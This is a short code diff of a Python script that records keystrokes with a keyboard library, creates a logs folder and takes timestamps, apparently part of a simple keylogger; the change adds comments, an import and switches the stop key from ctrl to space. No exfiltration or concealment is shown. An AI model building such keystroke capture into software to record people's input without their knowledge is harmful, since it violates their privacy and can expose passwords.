@@ -1,13 +1,14 @@
-from lib import keyboard
-from datetime import datetime
-import os
+from lib import keyboard    #for manipulate the keyboard
+from datetime import datetime   #for using date and hour
+import os   #file manager
+import re
 
 def checkLogsPath(path):
     if os.path.exists(path) == False:
         os.mkdir(path)
 
 def recording():
-    return keyboard.record(until=('ctrl'))
+    return keyboard.record(until=('space'))
 
 def calcualteDataAndHour():
     tempTime = datetime.now()
